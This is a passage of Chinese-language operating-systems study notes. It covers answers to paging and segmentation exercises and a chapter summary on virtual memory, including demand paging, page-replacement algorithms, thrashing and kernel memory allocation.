假设一个将页表存放在内存的分页系统：<br>a. 如果一次内存访问需 200ns， 访问一页内存要用多长间？<br>b. 如果加入TLB，并且75%的页表引用发生在TLB，内存有效访问时间是多少？（假设在TLB中查找页表项占用零时间， 如果页表项在其中。)</p></blockquote><p>a：需要400ns,用200ns访问内存页表，再用200ns进入内存中的字</p><p>b：有效查询时间=0.75*200ns+0.25*400ns=250ms</p><h3 id="810"><a class="markdownIt-Anchor" href="#810"></a> 8.10</h3><blockquote><p>为什么时常将分页与分段在同一个方案中结合使用？</p></blockquote><p>分段和分页通常结合在一起，以便相互改进。</p><p>当页表变得非常大时，分段非常有用。页表中未使用的较大连续部分可以折叠成页表地址为零的单个段表条目。分页分段处理需要大量时间进行分配的很长分段的情况。通过分页分段，我们减少了由于外部碎片造成的内存浪费，同时简化了分配</p><h3 id="811"><a class="markdownIt-Anchor" href="#811"></a> 8.11</h3><blockquote><p>试说明为什么使用分段比使用纯分页更容易共享一个可重入模块。</p></blockquote><h3 id="812"><a class="markdownIt-Anchor" href="#812"></a> 8.12</h3><blockquote><p>假设有下面的段表</p><p><img src="/posts/8ce3e425/image-20211223170751628.png" alt="image-20211223170751628"></p><p>下面逻辑地址的物理地址是多少？</p><p>a. 0430<br>b. 110<br>c. 2500<br>d. 3400<br>e. 4122</p></blockquote><p>根据逻辑地址分离出段号和段内偏移，首先需要根据段长度判断地址是否合法</p><p>a=430+219=649</p><p>b=10+2300=2310</p><p>c:段偏移500&gt;段长度100，越界，地址不合法</p><p>d=400+1327=1727</p><p>e:段偏移122&gt;段长度96,越界，不合法</p><h3 id="813"><a class="markdownIt-Anchor" href="#813"></a> 8.13</h3><blockquote><p>页表分页的目的是什么？</p></blockquote><p>分页（paging）内存管理方案允许进程的物理地址空间可以是非连续的。 分页避免了将不同大小的内存块匹配到交换空间上这样的麻烦。</p><p>在某些情况下，分页的页表可以变得足够大 ，可以简化内存分配问题（确保全部可以分配固定大小的页 ， 而不是可变大小的块）确保当前未使用的部分页表可以交换 。</p><h1 id="第9章-虚拟内存"><a class="markdownIt-Anchor" href="#第9章-虚拟内存"></a> 第9章 虚拟内存</h1><h2 id="91-背景"><a class="markdownIt-Anchor" href="#91-背景"></a> 9.1 背景</h2><p>虚拟内存（virtual memory）将用户逻辑内存与物理内存分开。这在现有物理内存有限的情况下， 为程序员提供了巨大的虚拟内存 。 虚拟内存使编程更加容易， 因为程序员不再需要担心可用的有限物理内存空间， 只需要关注所要解决的问题。</p><p><img src="/posts/8ce3e425/image-20220101142011629.png" alt="image-20220101142011629"></p><p>除了将逻辑内存与物理内存分开， 虚拟内存也允许文件和内存通过共享页而为两个或多个进程所共享（见 8.4.4 小节）。 这带来了如下优点：</p><ul><li>通过将共享对象映射到虚拟地址空间， 系统库可为多个进程所共享。 虽然每个进程都认为共享库是其虚拟地址空间的一部分， 而共享库所用的物理内存的实际页是为所有进程所共享。</li><li>类似地， 虚拟内存允许进程共享内存。 如第3章所述， 两个或多个进程之间可以通过使用共享内存来通信。虚拟内存允许一个进程创建内存区域，以便与其他进程进行共享。共享该内存区域的进程认为它是其虚拟地址空间的一部分， 而事实上这部分是共享的， 如图 9.3 所示。</li><li>虚拟内存可允许在用系统调用fork()创建进程期间共享页， 从而加快进程创建。</li></ul><p><img src="/posts/8ce3e425/image-20220101142401380.png" alt="image-20220101142401380"></p><h2 id="92-按需调页"><a class="markdownIt-Anchor" href="#92-按需调页"></a> 9.2 按需调页</h2><p>**按需调页（**demand paging）:</p><p>是在需要时才调入相应的页。 这种技术常为虚拟内存系统所采用。 对于按需调页虚拟内存，只有程序执行需要时才载入页，那些从未访问的页不会调入到物理内存。</p><h3 id="921-基本概念"><a class="markdownIt-Anchor" href="#921-基本概念"></a> 9.2.1 基本概念</h3><p>当换入进程时，调页程序推测在该进程再次换出之前会用到哪些页。调页程序不是调入整个进程，而是把那些必需的页调入内存。这样， 调页程序就避免了读入那些不使用的页，也减少了变换时间和所需的物理内存空间。</p><p>需要设置页表条目的<strong>有效-无效位</strong>来区分哪些页在内存里。</p><p><img src="/posts/8ce3e425/image-20220103132620930.png" alt="image-20220103132620930"></p><p>对标记为无效的访问会产生<strong>页错误陷阱</strong>（page-fault trap）。 分页硬件，在通过页表转换地址时，将发现己设置了无效位，会陷入操作系统。</p><p><strong>处理这种页错误的程序的流程：</strong></p><ul><li>①检查进程的内部页表（通常与PCB一起保存），以确定该引用是合法还是非法的地址访问。</li><li>②如果引用非法，那么终止进程。 如果引用有效但是尚未调入页面， 那么现在应调入。</li><li>③找到一个空闲帧 （例如，从空闲帧链表中选取一个）。</li><li>④调度一个磁盘操作， 以便将所需要的页调入刚分配的帧。</li><li>⑤当磁盘读操作完成后， 修改进程的内部表和页表， 以表示该页己在内存中。</li><li>⑥重新开始因陷阱而中断的指令。 进程现在能访问所需的页， 就好像它似乎总在内存中。</li></ul><p><img src="/posts/8ce3e425/image-20220103133033220.png" alt="image-20220103133033220"></p><p><strong>支持按需调页的硬件</strong>与分页和交换的硬件一样：</p><ul><li>页表： 该表能够通过有效－无效位或保护位的特定值， 将条目设为无效。</li><li>次级存储器：该次级存储器用来保存不在内存中的页。次级存储器通常为快速磁盘。它通常称为交换设备， 用于交换的这部分磁盘称为交换空间（ swap space）。</li></ul><h3 id="922-按需调页的性能"><a class="markdownIt-Anchor" href="#922-按需调页的性能"></a> 9.2.2 按需调页的性能</h3><p><strong>按需调页内存的有效访问时间：</strong></p><p>设p为页错误的概率（0≤p≤1）。 希望p接近于 0， 即页错误很少。</p><p>内存访问时间（用ma表示）的范围为10～200ns</p><p>那么有效访问时间为：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">有</mi><mi mathvariant="normal">效</mi><mi mathvariant="normal">访</mi><mi mathvariant="normal">问</mi><mi mathvariant="normal">时</mi><mi mathvariant="normal">间</mi><mi mathvariant="normal">＝</mi><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><mi>p</mi><mo stretchy="false">)</mo><mo>×</mo><mi>m</mi><mi>a</mi><mo>+</mo><mi>p</mi><mo>×</mo><mi mathvariant="normal">页</mi><mi mathvariant="normal">错</mi><mi mathvariant="normal">误</mi><mi mathvariant="normal">时</mi><mi mathvariant="normal">间</mi></mrow><annotation encoding="application/x-tex">有效访问时间＝ (1-p)×ma+p ×页错误时间</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">有</span><span class="mord cjk_fallback">效</span><span class="mord cjk_fallback">访</span><span class="mord cjk_fallback">问</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">间</span><span class="mord cjk_fallback">＝</span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">p</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0em;vertical-align:0em;"></span><span class="mord cjk_fallback">页</span><span class="mord cjk_fallback">错</span><span class="mord cjk_fallback">误</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">间</span></span></span></span></span></p><p>页错误会引起如下序列的动作产生：</p><ul><li>①陷入到操作系统。</li><li>②保存用户寄存器和进程状态。</li><li>③确定中断是否为页错误。</li><li>④检查页引用是否合法并确定页所在磁盘的位置。</li><li>⑤从磁盘读入页到空闲帧中。<ul><li>a. 在该磁盘队列中等待， 直到处理完读请求。</li><li>b. 等待磁盘的寻道和/或延迟时间。</li><li>c. 开始将磁盘的页传到空闲帧。</li></ul></li><li>⑥在等待时， 将 CPU 分配给其他用户（ CPU 调度， 可选）。</li><li>⑦从 I/O 子系统接收到中断（以示I/O完成）。</li><li>③保存其他用户的寄存器和进程状态（如果执行了第 6 步）。</li><li>⑨确定中断是否来自磁盘。</li><li>⑩修正页表和其他表以表示所需页现已在内存中。</li><li>⑪等待 CPU 再次分配给本进程。</li><li>⑫恢复用户寄存器、 进程状态和新页表， 再重新执行中断的指令。</li></ul><p>以上步骤并不是在所有情况下都是必需的。</p><p>不管如何， 都有如下三个主要的页错误处理时间：</p><ul><li>①处理页错误中断。</li><li>②读入页。</li><li>③重新启动进程。</li></ul><p>有效访问时间与页错误率直接有关。</p><p>按需调页的；另一个重要方面是<strong>交换空间的处理和使用</strong>。磁盘I/O到交换空间通常比到文件系统要快。 这是因为交换空间是按大块来分配的，并不使用文件查找和间接分配方法（第 12 章〉。因此，如果在进程开始时将整个文件镜像复制到交换空间，并从交换空间执行按页调度， 那么有可能获得更好的调页效果。 另一选择是开始时从文件系统中进行按需调页， 但是当出现页置换时则将页写入交换空间， 这种方法确保只有所需的页才从文件系统中调入，而以后出现的调页是从交换空间中读入的。</p><h2 id="93-写时复制"><a class="markdownIt-Anchor" href="#93-写时复制"></a> 9.3 写时复制</h2><p>传统上，fork()为子进程创建一个父进程地址空间的副本， 复制属于父进程的页。然而，由于许多子进程在创建之后通常马上会执行系统调用exec()，所以父进程地址空间的复制可能没有必要。</p><p>因此， 可以使用一 种称为<strong>写时复制</strong>（copy-on-write ）的技术。 这种方法允许父进程与子进程开始时共享同一页面。 这些页面标记为写时复制页， 即如果任何一个进程需要对页进行写操作，那么就创建一个共享页的副本。 写时复制如图 9.7 和图 9.8 所示;这两个图反映了进程 l修改页C前后的物理内存的情况。</p><p><img src="/posts/8ce3e425/image-20220103135108349.png" alt="image-20220103135108349"></p><p>只有可能修改的页才需要标记为写时复制。 不能修改的页（即包含可执行代码的页）可以为父进程和子进程所共享。</p><h2 id="94-页面置换"><a class="markdownIt-Anchor" href="#94-页面置换"></a> 9.4 页面置换</h2><p>内存的过度分配会出现以下问题。当一个用户进程执行时， 一个页错误发生。操作系统会确定所需页在磁盘上的位置， 但是却发现空闲帧列表上并没有空闲帧，所有内存都在使用。这时候就需要页置换算法。</p><h3 id="941-基本页置换"><a class="markdownIt-Anchor" href="#941-基本页置换"></a> 9.4.1 基本页置换</h3><p><strong>修改页错误处理程序</strong>以包括页置换：</p><ul><li>①查找所需页在磁盘上的位置。</li><li>②查找一个空闲帧：<ul><li>a. 如果有空闲帧， 那么就使用它。</li><li>b. 如果没有空闲帧， 那么就使用页置换算法以选择一个 “ 牺牲 ” 帧、。</li><li>c. 将 “ 牺牲 ” 帧的内容写到磁盘上， 改变页表和帧表。</li></ul></li><li>③将所需页读入(新)空闲帧， 改变页表和帧表。</li><li>④重启用户进程</li></ul><p>如果没有帧空闲，那么需要采用两个页传输（一个换出，一个换入）。这种情况实际上把页错误处理时间加倍了， 且也相应地增加了有效访问时间。  可以通过使用<strong>修改位</strong>（modify bit） 或脏位（dirty bit）以降低额外开销。每页或帧可以有一个修改位， 通过硬件与之相关联。每当页内的任何字或字节被写入时， 硬件就会设置该页的修改位以表示该页己修改。 如果修改位已设置， 那么就可以知道自从磁盘读入后该页己发生了修改。在这种情况下， 如果该页被选择为替换页， 就必须要把该页写到磁盘上去。然而， 如果修改位 没有设置， 那么也就知道自从磁盘读入后该页井没有发生修改。 因此， 磁盘上页的副本的内容没有必要（例如用其他页〉重写， 因此就避免了将内存页写回磁盘上。</p><p>为实现按需调页， 必须解决两个主要问题：必须开发帧分配算法和页置换算法。如果在内存中有多个进程， 那么必须决定为每个进程各分配多少帧。而且，当需要页置换时，必须选择要置换的帧。</p><h3 id="942-fifo页置换"><a class="markdownIt-Anchor" href="#942-fifo页置换"></a> 9.4.2 FIFO页置换</h3><p>最简单的页置换算法是<strong>FIFO算法</strong>。FIFO页置换算法为每个页记录着该页调入内存的时间。 当必须置换一页时， 将选择最旧的页。 注意并不需要记录调入一页的确切时间。可以创建一个FIFO队列来管理内存中的所有页。队列中的首页将被置换。当需要调入页时，将它加到队列的尾部。</p><p><img src="/posts/8ce3e425/image-20220103142955088.png" alt="image-20220103142955088"></p><h3 id="943-最优置换"><a class="markdownIt-Anchor" href="#943-最优置换"></a> 9.4.3 最优置换</h3><p><strong>最优页置换算法</strong>是所有算法中产生页错误率最低的，且绝没有Belady 异常的问题。这种算法确实存在， 它被称为 <strong>OPT 或 MIN</strong>。 它会置换最长时间不会使用的页。 使用这种页置换算法确保对于给定数量的帧会产生最低可能的页错误率。</p><p><img src="/posts/8ce3e425/image-20220103143129400.png" alt="image-20220103143129400"></p><p>然而，最优置换算法难以实现，因为需要引用串的未来知识（在 5.3.2小节讨论SJF CPU调度时，碰到过一个类似问题）。</p><h3 id="944-lru页置换"><a class="markdownIt-Anchor" href="#944-lru页置换"></a> 9.4.4 LRU页置换</h3><p>如果使用离过去最近作为不远将来的近似， 那么可置换最长时间没有使用的页（见图 9.15），这种方法称为<strong>最近最少使用算法</strong>（least-recently-used(<strong>LRU</strong>) algorithm）。</p><p><img src="/posts/8ce3e425/image-20220103143347226.png" alt="image-20220103143347226"></p><p><strong>栈</strong>：实现LRU置换的 一个方法是采用页码栈。每当引用一个页，该页就从栈中删除并放在顶部。 这样， 栈顶部总是最近使用的页， 栈底部总是LRU页（图9.16）。由于必须从栈中部删除项， 所以该栈可实现为具有头指针和尾指针的双向链表。 这样， 删除 一页并放在栈顶部在最坏情况下需要改变6个指针。 虽说每个更新有点费时，但是置换不需要搜索；尾指针指向栈底部，就是LRU页。 对于用软件或微代码的LRU置换的实现， 这种方法十分合适。</p><p><img src="/posts/8ce3e425/image-20220103143738632.png" alt="image-20220103143738632"></p><h3 id="945-近似lru页置换"><a class="markdownIt-Anchor" href="#945-近似lru页置换"></a> 9.4.5  近似LRU页置换</h3><p>很少有计算机系统能提供足够的硬件来支持真正的LRU页置换。有的系统不提供任何支持，因此必须使用其他置换算法（如FIFO算法）。</p><p>然而， 许多系统都通过<strong>引用位</strong>方式提供一定的支持。页表内的每项都关联着一个引用位（reference bit）。每当引用一个页时（无论是对页的字节进行读或写）， 相应页表的引用位就被硬件置位。开始， 操作系统会将所有引用位都清零。 随着用户进程的执行， 与引用页相关联的引用位被硬件置 位（置为 1）。之后，通过检查引用位，能够确定哪些页 使用过而哪些页未使用过。虽然不知道 使用顺序，但是知道哪些页 用过而哪些页未用过。这信息是许多近似LRU页置换算法的基础。</p><ol><li><p><strong>附加引用位算法</strong><br>通过在规定时间间隔里记录引用位，可以获得额外顺序信息。 可以为位于内存内的每个表中的页保留一个8位的字节。在规定时间间隔（如， 每100 ms） 内，时钟定时器产生中断并将控制转交给操作系统。 操作系统把每个页的引用位转移到其8位字节的高位，而将 其他位向右移一位，并抛弃最低位。 这些8位移位寄存器包含着该页在最近8个时间周期内的使用情况。 例如，如果移位寄存器含有00000000，那么该页在8个时间周期内没有使用：如果移位寄存器的值为11111111， 那么该页在过去每个周期内都至少使用过 一次。具有值为11000100 的移位寄存器的页要比值为01110111 的页更为最近使用。 如果将这8位字节作为无符号整数，那么具有最小值的页为LRU页，且可以被置换。</p></li><li><p><strong>二次机会算法</strong></p><p>二次机会置换的基本算法是 FIFO 置换算法。 当要选择一个页时，检查其引用位。如果其值为0，那么就直接置换该页。如果引用位为1，那么就给该页第二次机会，并选择下一个FIFO 页。当一个页获得第二次机会时，其引用位清零，且其到达时间设为当前时间。因此，获得第二次机会的页在所有其他页置换（或获得第二次机会）之前，是不会被置换的。 另外，如果一 个页经常使用以致其引用位总是被设置， 那么它就不会被置换。</p><p>一种实现二次机会算法（有时称为<strong>时钟算法</strong>）的方法是采用循环队列。 用一个指针表示下次要置换哪一页。 当需要一个帧时，指针向前移动直到找到一个引用位为0的页。在向前移动时，它将清除引用位（见图 9.17）。一旦找到牺牲页，就置换该页，新页就插入到循环队列的该位置。注意：在最坏情况下，所有位均己设置，指针会遍历整个循环队列，以便给每个页第二次机会。 它将清除所有引用位后再选择页来置换。 这样，如果所有位均已设置，那么二次机会置换就变成了FIFO 置换。</p><p><img src="/posts/8ce3e425/image-20220103144540004.png" alt="image-20220103144540004"></p></li><li><p><strong>增强型二次机会算法</strong><br>通过将引用位和修改位（将在 9.4.1 小节中介绍〉作为一有序对来考虑，可以改进二次机会算法。 采用这两个位，有下面四种可能类型：<br>①（0, 0）最近没有使用且也没有修改一一 用于置换的最佳页。</p><p>②（0, 1）最近没有使用 但修改过一一不是很好，因为在置换之前需要将页写出到磁盘。</p><p>③ (1, 0）最近使用过但没有修改一一它有可能很快又要被使用。</p><p>④（1, 1）最近使用过且修改过一一它有可能很快又要被使用， 且置换之前需要将页写出到磁盘。</p></li></ol><h3 id="946-基于计数的页置换"><a class="markdownIt-Anchor" href="#946-基于计数的页置换"></a> 9.4.6 基于计数的页置换</h3><p>还有许多其他算法可用于页置换。 例如， 可以为每个页保留一个用于记录其引用次数的计数器， 并可形成如下两个方案。</p><ul><li><p><strong>最不经常使用页置换算法</strong>（ least frequently used (<strong>LFU</strong>) page-replacement algorithm）要求置换计数最小的页。 这种选择的理由是活动页应该有更大的引用次数。 这种算法会产生如下问题： 一个页在进程开始时使用很多， 但以后就不再使用。 由于其使用过很多， 所以它有较大次数， 所以即使不再使用仍然会在内存中。 解决方法之一是定期地将次数寄存器右移一位， 以形成指数衰减的平均使用次数。</p></li><li><p><strong>最常使用页置换算法</strong>（ most frequently used (<strong>MFU</strong>) page-replacement algorithm） 是基于如下理论： 具有最小次数的页可能刚刚调进来， 且还没有使用。可以想象，MFU 和 LFU 置换都不常用。 这两种算法的实现都很费时， 且并不能很好地近似OPT置换算法。</p></li></ul><h3 id="947-页缓冲算法"><a class="markdownIt-Anchor" href="#947-页缓冲算法"></a> 9.4.7 页缓冲算法</h3><p>除了特定页置换算法外， 还经常采用其他措施。 例如，系统通常保留一个空闲帧缓冲池。 当出现页错误时， 会像以前一样选择一个牺牲帧。 然而， 在牺牲帧写出之前，所需要的页就从缓冲池中读到空闲内存。 这种方法允许进程尽可能快地重启，而无须等待牺牲帧页的写出。 当在牺牲帧以后写出时， 它再加入到空闲帧池。</p><p>另 一种修改是保留一个空闲帧池， 但要记住哪些页在哪些帧中。 由于当帧写到磁盘上时其内容并没有修改， 所以在该帧被重用之前如果需要使用原来页， 那么原来页可直接从空闲帧池中取出来使用。 这时并不需要1/0。 当一个页错误发生时， 先检查所需要页是否在空闲帧池中。 如果不在， 那么才必须选择一个空闲帧来读入所需页。</p><h2 id="95-帧分配"><a class="markdownIt-Anchor" href="#95-帧分配"></a> 9.5 帧分配</h2><h3 id="951-帧的最少数量"><a class="markdownIt-Anchor" href="#951-帧的最少数量"></a> 9.5.1 帧的最少数量</h3><p>每个进程帧的最少数量是由体系结构决定的，而最大数量是由可用物理内存的数量来决定。在这两者之间，关于帧分配还是有很多选择的。</p><h3 id="952-分配算法"><a class="markdownIt-Anchor" href="#952-分配算法"></a> 9.5.2 分配算法</h3><p><strong>平均分配</strong></p><p>在n个进程之间分配 m个帧的最为容易的方法是给每个一个平均值，即 m/n 帧</p><p><strong>比例分配</strong></p><p>根据进程大小，而将可用内存分配给每个进程。设进程 Pt的虚拟内存大小为S<sub>i</sub>且定义</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>S</mi><mo>=</mo><mo>∑</mo><msub><mi>s</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">S=\sum s_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.6000100000000002em;vertical-align:-0.55001em;"></span><span class="mop op-symbol large-op" style="position:relative;top:-0.000004999999999977245em;">∑</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p><p>这样， 如果可用帧的总数为m，那么进程 P<sub>i</sub> 可分配到 a~i个帧， 这里a；近似为</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>a</mi><mi>i</mi></msub><mo>=</mo><msub><mi>s</mi><mi>i</mi></msub><mi mathvariant="normal">/</mi><mi>S</mi><mo>×</mo><mi>m</mi></mrow><annotation encoding="application/x-tex">a_i=s_i/S×m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span></span></span></span></span></p><h3 id="953-全局分配与局部分配"><a class="markdownIt-Anchor" href="#953-全局分配与局部分配"></a> 9.5.3 全局分配与局部分配</h3><p>各个进程分配帧的另 一个重要因素是页置换。 当有多个进程竞争帧时， 可将页置换算法分为两大类： <strong>全局置换</strong>（global replacement）和<strong>局部置换</strong>（local replacement）。</p><ul><li><strong>全局置换</strong>允许一个进程从所有帧集合中选择一个置换帧， 而不管该帧是否已分配给其他进程， 即一个进程可以从另一个进程中拿到帧。</li><li><strong>局部置换</strong>要求每个进程仅从其自己的分配帧中进行选择。</li></ul><p>局部置换不能使用其他进程的不常用的内存， 所以会阻碍一个进<br>程。因此， 全局置换通常会有更好的系统吞吐量， 且更为常用。</p><h2 id="96-系统颠簸"><a class="markdownIt-Anchor" href="#96-系统颠簸"></a> 9.6 系统颠簸</h2><p>频繁的页调度行为称为颠簸（thrashing）。如果一个进程在换页上用的时间要多于执行时间， 那么这个进程就在颠簸。</p><h3 id="961-系统颠簸的原因"><a class="markdownIt-Anchor" href="#961-系统颠簸的原因"></a> 9.6.1 系统颠簸的原因</h3><p>操作系统在监视CPU的使用率。 如果CPU使用率太低， 那么向系统中引入新进程，以增加多道程序的程度。采用全局置换算法，它会置换页而不管这些页是属于哪个进程的。现在假设一个进程进入一个新执行阶段， 需要更多的帧。 它开始出现页错误， 并从其他进程中拿到帧。 然而， 这些进程也需要这些页， 所以它们也会出现页错误， 从而从其他进程中拿到帧。 这些页错误进程必须使用调页设备以换进和换出页。 随着它们排队等待换页设备， 就绪队列会变空， 而进程等待调页设备，CPU使用率就会降低。</p><p>CPU调度程序发现CPU使用率降低，因此会增加多道程序的程度。 新进程试图从其他运行进程中拿到帧，从而引起更多页错误， 形成更长的调页设备的队列。 因此，CPU使用率进一步降低，CPU调度程序试图再增加多道程序的程度。 这样就出现了系统颠簸， 系统吞吐量陡降， 页错误显著增加。 因此， 有效内存访问时间增加。 最终因为进程主要忙于调页， 系统不能完成一件工作。</p><p><img src="/posts/8ce3e425/image-20220103150630462.png" alt="image-20220103150630462"></p><h3 id="962-工作集合模型"><a class="markdownIt-Anchor" href="#962-工作集合模型"></a> 9.6.2 工作集合模型</h3><p>工作集合模型（working-set model) 是基于局部性假设的。该模型使用参数<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">Δ</mi></mrow><annotation encoding="application/x-tex">\Delta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">Δ</span></span></span></span> 定义工作集合窗口（working-set window）。其思想是检查最近<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">Δ</mi></mrow><annotation encoding="application/x-tex">\Delta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">Δ</span></span></span></span>个页的引用。 这最近<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">Δ</mi></mrow><annotation encoding="application/x-tex">\Delta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">Δ</span></span></span></span>个引用的页集合称为工作集合（working set) （如图 9.20 所示）。如果一个页正在使用中，<br>那么它就在工作集合内。如果它不再使用，那么它会在其上次引用的A时间单位后从工作集合中删除。 因此，工作集合是程序局部的近似。</p><p><img src="/posts/8ce3e425/image-20220103184407266.png" alt="image-20220103184407266"></p><h3 id="963-页错误频率"><a class="markdownIt-Anchor" href="#963-页错误频率"></a> 9.6.3 页错误频率</h3><p>颠簸具有高的页错误率。因此，需要控制页错误率。当页错误率太高时， 进程需要更多帧。类似地，如果页错误率太低，那么进程可能有太多的帧。 可以为所期望的页错误率设置上限和下限（见图 9.21 ）。 如果实际页错误率超过上限，那么为进程分配更多的帧：如果实际页错误率低于下限，那么可从该进程中移走帧。因此，可以直接测量 和控制页错误率以防止颠簸。与工作集合策略一样， 也可能必须暂停一个进程。 如果页错误增加且没有可用帧， 那么必须选择一个进程暂停。 接着， 可将释放的帧分配给那些具有高页错误率的进程。</p><h2 id="97-内存映射文件"><a class="markdownIt-Anchor" href="#97-内存映射文件"></a> 9.7 内存映射文件</h2><h3 id="971-基本机制"><a class="markdownIt-Anchor" href="#971-基本机制"></a> 9.7.1 基本机制</h3><p>文件的内存映射可将一磁盘块映射成内存的一页（或多页）。 开始的文件访问按普通请求页面调度来进行， 会产生页错误。这样， 一页大小的部分文件从文件系统读入物理页（有的系统会一次读入多个一页大小的内容〉。以后文件的读写就按通常的内存访问来处理，由于是通过内存操作文件而不是使用系统调用 read()和 write()， 从而简化了文件访问和使用。</p><p><img src="/posts/8ce3e425/image-20220103194041972.png" alt="image-20220103194041972"></p><h3 id="972-win32-api中的共享内存"><a class="markdownIt-Anchor" href="#972-win32-api中的共享内存"></a> 9.7.2 Win32 API中的共享内存</h3><h3 id="973-内存映射io"><a class="markdownIt-Anchor" href="#973-内存映射io"></a> 9.7.3 内存映射I/O</h3><h2 id="98-内核内存的分配"><a class="markdownIt-Anchor" href="#98-内核内存的分配"></a> 9.8 内核内存的分配</h2><h3 id="981-buddy系统"><a class="markdownIt-Anchor" href="#981-buddy系统"></a> 9.8.1 Buddy系统</h3><p>“Buddy系统 ” 从物理上连续的大小固定的段上进行分配。内存按2幂的大小来进行分配， 即 4 KB、 8 KB、 16 KB等。 如果请求大小不为 2 的事， 那么需要调整到下一个更大的 2 的幂。 例如， 请求大小为 11KB， 那么会按 16 KB 来请求。</p><p><img src="/posts/8ce3e425/image-20220103194814856.png" alt="image-20220103194814856"></p><p>Buddy 系统的一个<strong>优点</strong>是可通过合并而快速地形成更大的段。 例如，如果图 9.27 中的CL 被释放，那么CL 和CR 可合并成 64KB 的段。而这个段BL 又可同BR 合并而得到 128KB的段。 最终， 得到了原来的大小为 256KB 的段。<br>Buddy 系统的一个明显<strong>缺点</strong>是由于调整到下一个 2 的事容易产生碎片。 例如， 33KB的内存请求只能用 64KB 的段来满足。 事实上，可能有 50%的内存会因碎片而浪费。 下面讨论另一种没有碎片损失的内存分配。</p><h3 id="982-slab分配"><a class="markdownIt-Anchor" href="#982-slab分配"></a> 9.8.2 slab分配</h3><p>内核分配的另 一种方案是 slab 分配。 slab 是由一个或多个物理上连续的页组成的。 高速缓存（ cache ）含有一个或多个 slab。 每个内核数据结构都有一个 cache， 如进程描述符、文件对象、 信号量等。 每个 cache 含有内核数据结构的对象实例。 例如， 信号量 cache 存储着信号量对象，进程描述符 cache 存储着进程描述符对象。 图 9.28 描述 slab、 cache 及对象三者之间的关系。 该图中有两个 3KB 大小的内核对象和三个 7KB 大小的内核对象。 